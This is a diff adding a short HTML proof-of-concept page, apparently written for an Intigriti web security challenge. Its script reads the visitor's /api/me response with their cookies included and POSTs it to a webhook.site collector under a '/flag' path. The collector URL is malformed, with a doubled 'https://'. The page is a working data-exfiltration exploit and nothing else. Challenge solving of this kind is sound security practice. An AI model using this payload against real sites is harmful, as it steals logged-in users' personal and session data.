@@ -1,0 +1,26 @@
+<html>
+  <head>
+    <title>PoC</title>
+  </head>
+
+  <body>
+    <h1>OOO Poc OOO</h1>
+    <script>
+fetch("https://challenge-0126.intigriti.io/api/me", {
+    method: "GET",
+    credentials: "include"
+})
+.then(r => r.text())
+.then(d => {
+    fetch("https://https://webhook.site/9acf5a8d-abd2-4389-8941-68d5198823d8/flag", {
+        method: "POST",
+        headers: {
+            "Content-Type": "application/json"
+        },
+        body: JSON.stringify({ data: d })
+    });
+});
+    </script>
+
+  </body>
+</html>
